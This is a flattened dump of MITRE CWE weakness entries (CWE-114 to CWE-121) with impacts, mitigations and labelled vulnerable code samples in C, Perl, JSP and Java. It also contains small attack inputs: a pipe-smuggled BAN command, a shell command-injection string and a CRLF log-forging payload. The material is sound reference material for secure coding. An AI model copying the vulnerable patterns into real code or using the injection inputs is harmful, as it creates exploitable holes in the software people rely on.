Language:CLoadLibrary(""liberty.dll"");The problem is that the program does not specify an absolute path for liberty.dll. If an attacker is able to place a malicious library named liberty.dll higher in the search order than file the application intends to load, then the application will load the malicious copy instead of the intended file. Because of the nature of the application, it runs with elevated privileges, which means the contents of the attacker's liberty.dll will now be run with elevated privileges, possibly giving the attacker complete control of the system. The type of attack seen in this example is made possible because of the search order used by LoadLibrary() when an absolute path is not specified. If the current directory is searched before system directories, as was the case up until the most recent versions of Windows, then this type of attack becomes trivial if the attacker can execute the program locally. The search order is operating system version dependent, and is controlled on newer operating systems by the value of the registry key: HKLM\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode","Phase:  Architecture and DesignStrategy:  Libraries or FrameworksLibraries that are loaded should be well understood and come from a trusted source. The application can execute code contained in the native libraries, which often contain calls that are susceptible to other security problems, such as buffer overflows or command injection. All native libraries should be validated to determine if the application requires the use of the library. It is very difficult to determine what these native libraries actually do, and the potential for malicious code is high. In addition, the potential for an inadvertent mistake in these native libraries is also high, as many are written in C or C++ and may be susceptible to buffer overflow or race condition problems. To help prevent buffer overflow attacks, validate all input to native calls for content and length. If the native library does not come from a trusted source, review the source code of the library. The library should be built from the reviewed source before using it."
CWE-115: Misinterpretation of Input,"The product misinterprets an input, whether from an attacker or another product, in a security-relevant fashion.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,无可能的缓解方案
CWE-116: Improper Encoding or Escaping of Output,"The product prepares a structured message for communication with another component, but encoding or escaping of the data is either missing or done incorrectly. As a result, the intended structure of the message is not preserved.","Scope: Integrity, Impact: Technical Impact:Modify Application DataThe communications between components can be modified in unexpected ways. Unexpected commands can be executed, bypassing other security mechanisms. Incoming data can be misinterpreted., Likelihood: ; Scope: IntegrityConfidentialityAvailabilityAccess Control, Impact: Technical Impact:Execute Unauthorized Code or CommandsThe communications between components can be modified in unexpected ways. Unexpected commands can be executed, bypassing other security mechanisms. Incoming data can be misinterpreted., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Bypass Protection MechanismThe communications between components can be modified in unexpected ways. Unexpected commands can be executed, bypassing other security mechanisms. Incoming data can be misinterpreted., Likelihood: ","Example 1This code displays an email address that was submitted as part of a form.(bad code)Example Language:JSP<% String email = request.getParameter(""email""); %>...Email Address: <%= email %>The value read from the form parameter is reflected back to the client browser without having been encoded prior to output, allowing various XSS attacks (CWE-79).Example 2Consider a chat application in which a front-end web application communicates with a back-end server. The back-end is legacy code that does not perform authentication or authorization, so the front-end must implement it. The chat protocol supports two commands, SAY and BAN, although only administrators can use the BAN command. Each argument must be separated by a single space. The raw inputs are URL-encoded. The messaging protocol allows multiple commands to be specified on the same line if they are separated by a ""|"" character.First let's look at the back end command processor code(bad code)Example Language:Perl$inputString = readLineFromFileHandle($serverFH);# generate an array of strings separated by the ""|"" character.@commands = split(/\|/, $inputString);foreach $cmd (@commands) {# separate the operator from its arguments based on a single whitespace($operator, $args) = split(/ /, $cmd, 2);$args = UrlDecode($args);if ($operator eq ""BAN"") {ExecuteBan($args);}elsif ($operator eq ""SAY"") {ExecuteSay($args);}}The front end web application receives a command, encodes it for sending to the server, performs the authorization check, and sends the command to the server.(bad code)Example Language:Perl$inputString = GetUntrustedArgument(""command"");($cmd, $argstr) = split(/\s+/, $inputString, 2);# removes extra whitespace and also changes CRLF's to spaces$argstr =~ s/\s+/ /gs;$argstr = UrlEncode($argstr);if (($cmd eq ""BAN"") && (! IsAdministrator($username))) {die ""Error: you are not the admin.\n"";}# communicate with file server using a file handle$fh = GetServerFileHandle(""myserver"");print $fh ""$cmd $argstr\n"";It is clear that, while the protocol and back-end allow multiple commands to be sent in a single request, the front end only intends to send a single command. However, the UrlEncode function could leave the ""|"" character intact. If an attacker provides:(attack code)SAY hello world|BAN user12then the front end will see this is a ""SAY"" command, and the $argstr will look like ""hello world | BAN user12"". Since the command is ""SAY"", the check for the ""BAN"" command will fail, and the front end will send the URL-encoded command to the back end:(result)SAY hello%20world|BAN%20user12The back end, however, will treat these as two separate commands:(result)SAY hello worldBAN user12Notice, however, that if the front end properly encodes the ""|"" with ""%7C"", then the back end will only process a single command.Example 3This example takes user input, passes it through an encoding scheme and then creates a directory specified by the user.(bad code)Example Language:Perlsub GetUntrustedInput {return($ARGV[0]);}sub encode {my($str) = @_;$str =~ s/\&/\&amp;/gs;$str =~ s/\""/\&quot;/gs;$str =~ s/\'/\&apos;/gs;$str =~ s/\</\&lt;/gs;$str =~ s/\>/\&gt;/gs;return($str);}sub doit {my $uname = encode(GetUntrustedInput(""username""));print ""<b>Welcome, $uname!</b><p>\n"";system(""cd /home/$uname; /bin/ls -l"");}The programmer attempts to encode dangerous characters, however the denylist for encoding is incomplete (CWE-184) and an attacker can still pass a semicolon, resulting in a chain with command injection (CWE-77).Additionally, the encoding routine is used inappropriately with command execution. An attacker doesn't even need to insert their own semicolon. The attacker can instead leverage the encoding routine to provide the semicolon to separate the commands. If an attacker supplies a string of the form:(attack code)' pwdthen the program will encode the apostrophe and insert the semicolon, which functions as a command separator when passed to the system function. This allows the attacker to complete the command injection.","Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.Alternately, use built-in functions, but consider using wrappers in case those functions are discovered to have a vulnerability.Phase:  Architecture and DesignStrategy:  ParameterizationIf available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.For example, stored procedures can enforce database query structure and reduce the likelihood of SQL injection.Phases:  Architecture and Design; ImplementationUnderstand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.Phase:  Architecture and DesignIn some cases, input validation may be an important strategy when output encoding is not a complete solution. For example, you may be providing the same output that will be processed by multiple consumers that use different encodings or representations. In other cases, you may be required to allow user-supplied input to contain control information, such as limited HTML tags that support formatting in a wiki or bulletin board. When this type of requirement must be met, use an extremely strict allowlist to limit which control sequences can be used. Verify that the resulting syntactic structure is what you expect. Use your normal encoding methods for the remainder of the input.Phase:  Architecture and DesignUse input validation as a defense-in-depth measure to reduce the likelihood of output encoding errors (seeCWE-20).Phase:  RequirementsFully specify which encodings are required by components that will be communicating with each other.Phase:  ImplementationWhen exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so."
CWE-117: Improper Output Neutralization for Logs,The product does not neutralize or incorrectly neutralizes output that is written to logs.,"Scope: IntegrityConfidentialityAvailabilityNon-Repudiation, Impact: Technical Impact:Modify Application Data; Hide Activities; Execute Unauthorized Code or CommandsInterpretation of the log files may be hindered or misdirected if an attacker can supply data to the application that is subsequently logged verbatim. In the most benign case, an attacker may be able to insert false entries into the log file by providing the application with input that includes appropriate characters. Forged or otherwise corrupted log files can be used to cover an attacker's tracks, possibly by skewing statistics, or even to implicate another party in the commission of a malicious act. If the log file is processed automatically, the attacker can render the file unusable by corrupting the format of the file or injecting unexpected characters. An attacker may inject code or other commands into the log file and take advantage of a vulnerability in the log processing utility., Likelihood: ","Example 1The following web application code attempts to read an integer value from a request object. If the parseInt call fails, then the input is logged with an error message indicating what happened.(bad code)Example Language:JavaString val = request.getParameter(""val"");try {int value = Integer.parseInt(val);}catch (NumberFormatException) {log.info(""Failed to parse val = "" + val);}...If a user submits the string ""twenty-one"" for val, the following entry is logged:INFO: Failed to parse val=twenty-oneHowever, if an attacker submits the string ""twenty-one%0a%0aINFO:+User+logged+out%3dbadguy"", the following entry is logged:INFO: Failed to parse val=twenty-oneINFO: User logged out=badguyClearly, attackers can use this same mechanism to insert arbitrary log entries.","Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-118: Incorrect Access of Indexable Resource ('Range Error'),"The product does not restrict or incorrectly restricts operations within the boundaries of a resource that is accessed using an index or pointer, such as memory or files.","Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ",无示范例子,无可能的缓解方案
CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer,"The product performs operations on a memory buffer, but it can read from or write to a memory location that is outside of the intended boundary of the buffer.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands; Modify MemoryIf the memory accessible by the attacker can be effectively controlled, it may be possible to execute arbitrary code, as with a standard buffer overflow. If the attacker can overwrite a pointer's worth of memory (usually 32 or 64 bits), they can redirect a function pointer to their own malicious code. Even when the attacker can only modify a single byte arbitrary code execution can be possible. Sometimes this is because the same problem can be exploited repeatedly to the same effect. Other times it is because the attacker can overwrite security-critical application-specific data -- such as a flag indicating whether the user is an administrator., Likelihood: ; Scope: AvailabilityConfidentiality, Impact: Technical Impact:Read Memory; DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory)Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read MemoryIn the case of an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffers position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences., Likelihood:","Example 1This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.(bad code)Example Language:Cvoid host_lookup(char *user_supplied_addr){struct hostent *hp;in_addr_t *addr;char hostname[64];in_addr_t inet_addr(const char *cp);/*routine that ensures user_supplied_addr is in the right format for conversion */validate_addr_form(user_supplied_addr);addr = inet_addr(user_supplied_addr);hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);strcpy(hostname, hp->h_name);}This function allocates a buffer of 64 bytes to store the hostname, however there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker.Note that this example also contains an unchecked return value (CWE-252) that can lead to a NULL pointer dereference (CWE-476).Example 2This example applies an encoding procedure to an input string and stores it into a buffer.(bad code)Example Language:Cchar * copy_input(char *user_supplied_string){int i, dst_index;char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);if ( MAX_SIZE <= strlen(user_supplied_string) ){die(""user string too long, die evil hacker!"");}dst_index = 0;for ( i = 0; i < strlen(user_supplied_string); i++ ){if( '&' == user_supplied_string[i] ){dst_buf[dst_index++] = '&';dst_buf[dst_index++] = 'a';dst_buf[dst_index++] = 'm';dst_buf[dst_index++] = 'p';dst_buf[dst_index++] = ';';}else if ('<' == user_supplied_string[i] ){/* encode to &lt; */}else dst_buf[dst_index++] = user_supplied_string[i];}return dst_buf;}The programmer attempts to encode the ampersand character in the user-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands.Example 3The following example asks a user for an offset into an array to select an item.(bad code)Example Language:Cint main (int argc, char **argv) {char *items[] = {""boat"", ""car"", ""truck"", ""train""};int index = GetUntrustedOffset();printf(""You selected %s\n"", items[index-1]);}The programmer allows the user to specify which element in the list to select, however an attacker can provide an out-of-bounds offset, resulting in a buffer over-read (CWE-126).Example 4In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method(bad code)Example Language:Cint getValueFromArray(int *array, int len, int index) {int value;// check that the array index is less than the maximum// length of the arrayif (index < len) {// get the value at the specified index of the arrayvalue = array[index];}// if array index is invalid then output error message// and return value indicating errorelse {printf(""Value is: %d\n"", array[index]);value = -1;}return value;}However, this method only verifies that the given array index is less than the maximum length of the array but does not check for the minimum value (CWE-839). This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read (CWE-125) and may allow access to sensitive memory. The input array index should be checked to verify that is within the maximum and minimum range required for the array (CWE-129). In this example the if statement should be modified to include a minimum range check, as shown below.(good code)Example Language:C...// check that the array index is within the correct// range of values for the arrayif (index >= 0 && index < len) {...Example 5Windows provides the _mbs family of functions to perform various operations on multibyte strings. When these functions are passed a malformed multibyte string, such as a string containing a valid leading byte followed by a single null byte, they can read or write past the end of the string buffer causing a buffer overflow. The following functions all pose a risk of buffer overflow: _mbsinc _mbsdec _mbsncat _mbsncpy _mbsnextc _mbsnset _mbsrev _mbsset _mbsstr _mbstok _mbccpy _mbslen","Phase:  RequirementsStrategy:  Language SelectionUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.Note:This is not a complete solution, since many buffer overflows are not related to strings.Phases:  Operation; Build and CompilationStrategy:  Environment HardeningUse automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking.D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.Effectiveness: Defense in DepthNote:This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application.Phase:  ImplementationConsider adhering to the following rules when allocating and managing an application's memory:Double check that the buffer is as large as specified.When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space.If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.Phases:  Operation; Build and CompilationStrategy:  Environment HardeningRun or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as ""rebasing"" (for Windows) and ""prelinking"" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking.For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].Effectiveness: Defense in DepthNote:These techniques do not provide a complete solution. For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]Phase:  OperationStrategy:  Environment HardeningUse a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment.For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].Effectiveness: Defense in DepthNote:This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application.Phase:  ImplementationReplace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.Effectiveness: ModerateNote:This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131)."
CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow'),"The product copies an input buffer to an output buffer without verifying that the size of the input buffer is less than the size of the output buffer, leading to a buffer overflow.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Modify Memory; Execute Unauthorized Code or CommandsBuffer overflows often can be used to execute arbitrary code, which is usually outside the scope of the product's implicit security policy. This can often be used to subvert any other security service., Likelihood: ; Scope: Availability, Impact: Technical Impact:Modify Memory; DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU)Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the product into an infinite loop., Likelihood: ","Example 1The following code asks the user to enter their last name and then attempts to store the value entered in the last_name array.(bad code)Example Language:Cchar last_name[20];printf (""Enter your last name: "");scanf (""%s"", last_name);The problem with the code above is that it does not restrict or limit the size of the name entered by the user. If the user enters ""Very_very_long_last_name"" which is 24 characters long, then a buffer overflow will occur since the array can only hold 20 characters total.Example 2The following code attempts to create a local copy of a buffer to perform some manipulations to the data.(bad code)Example Language:Cvoid manipulate_string(char * string){char buf[24];strcpy(buf, string);...}However, the programmer does not ensure that the size of the data pointed to by string will fit in the local buffer and copies the data with the potentially dangerous strcpy() function. This may result in a buffer overflow condition if an attacker can influence the contents of the string parameter.Example 3The code below calls the gets() function to read in data from the command line.(bad code)Example Language:Cchar buf[24];printf(""Please enter your name and press <Enter>\n"");gets(buf);...}However, gets() is inherently unsafe, because it copies all input from STDIN to the buffer without checking size. This allows the user to provide a string that is larger than the buffer size, resulting in an overflow condition.Example 4In the following example, a server accepts connections from a client and processes the client request. After accepting a client connection, the program will obtain client information using the gethostbyaddr method, copy the hostname of the client that connected to a local variable and output the hostname of the client to a log file.(bad code)Example Language:C...struct hostent *clienthp;char hostname[MAX_LEN];// create server socket, bind to server address and listen on socket...// accept client connections and process requestsint count = 0;for (count = 0; count < MAX_CONNECTIONS; count++) {int clientlen = sizeof(struct sockaddr_in);int clientsocket = accept(serversocket, (struct sockaddr *)&clientaddr, &clientlen);if (clientsocket >= 0) {clienthp = gethostbyaddr((char*) &clientaddr.sin_addr.s_addr, sizeof(clientaddr.sin_addr.s_addr), AF_INET);strcpy(hostname, clienthp->h_name);logOutput(""Accepted client connection from host "", hostname);// process client request...close(clientsocket);}}close(serversocket);...However, the hostname of the client that connected may be longer than the allocated size for the local hostname variable. This will result in a buffer overflow when copying the client hostname to the local variable using the strcpy method.","Phase:  RequirementsStrategy:  Language SelectionUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.Note:This is not a complete solution, since many buffer overflows are not related to strings.Phases:  Operation; Build and CompilationStrategy:  Environment HardeningUse automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking.D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.Effectiveness: Defense in DepthNote:This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application.Phase:  ImplementationConsider adhering to the following rules when allocating and managing an application's memory:Double check that your buffer is as large as you specify.When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space.If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phases:  Operation; Build and CompilationStrategy:  Environment HardeningRun or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as ""rebasing"" (for Windows) and ""prelinking"" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking.For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].Effectiveness: Defense in DepthNote:These techniques do not provide a complete solution. For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]Phase:  OperationStrategy:  Environment HardeningUse a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment.For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].Effectiveness: Defense in DepthNote:This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application.Phases:  Build and Compilation; OperationMost mitigating technologies at the compiler or OS level to date address only a subset of buffer overflow problems and rarely provide complete protection against even that subset. It is good practice to implement strategies to increase the workload of an attacker, such as leaving the attacker to guess an unknown value that changes every program execution.Phase:  ImplementationReplace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.Effectiveness: ModerateNote:This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131).Phase:  Architecture and DesignStrategy:  Enforcement by ConversionWhen the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.Phases:  Architecture and Design; OperationStrategy:  Sandbox or JailRun the code in a ""jail"" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.Be careful to avoidCWE-243and other weaknesses related to jails.Effectiveness: LimitedNote:The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."
CWE-121: Stack-based Buffer Overflow,"A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function).","Scope: Availability, Impact: Technical Impact:Modify Memory; DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory)Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop., Likelihood: ; Scope: IntegrityConfidentialityAvailabilityAccess Control, Impact: Technical Impact:Modify Memory; Execute Unauthorized Code or Commands; Bypass Protection MechanismBuffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy., Likelihood: ; Scope: IntegrityConfidentialityAvailabilityAccess ControlOther, Impact: Technical Impact:Modify Memory; Execute Unauthorized Code or Commands; Bypass Protection Mechanism; OtherWhen the consequence is arbitrary code execution, this can often be used to subvert any other security service., Likelihood: ","Example 1While buffer overflow examples can be rather complex, it is possible to have very simple, yet still exploitable, stack-based buffer overflows:(bad code)Example Language:C#define BUFSIZE 256int main(int argc, char **argv) {char buf[BUFSIZE];strcpy(buf, argv[1]);}The buffer size is fixed, but there is no guarantee the string in argv[1] will not exceed this size and cause an overflow.Example 2This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.(bad code)Example Language:Cvoid host_lookup(char *user_supplied_addr){struct hostent *hp;in_addr_t *addr;char hostname[64];in_addr_t inet_addr(const char *cp);/*routine that ensures user_supplied_addr is in the right format for conversion */validate_addr_form(user_supplied_addr);addr = inet_addr(user_supplied_addr);hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);strcpy(hostname, hp->h_name);}This function allocates a buffer of 64 bytes to store the hostname, however there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker.Note that this example also contains an unchecked return value (CWE-252) that can lead to a NULL pointer dereference (CWE-476).","Phases:  Operation; Build and CompilationStrategy:  Environment HardeningUse automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking.D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.Effectiveness: Defense in DepthNote:This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application.Phase:  Architecture and DesignUse an abstraction library to abstract away risky APIs. Not a complete solution.Phase:  ImplementationImplement and perform bounds checking on input.Phase:  ImplementationDo not use dangerous functions such as gets. Use safer, equivalent functions which check for boundary errors.Phases:  Operation; Build and CompilationStrategy:  Environment HardeningRun or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as ""rebasing"" (for Windows) and ""prelinking"" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking.For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].Effectiveness: Defense in DepthNote:These techniques do not provide a complete solution. For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]"
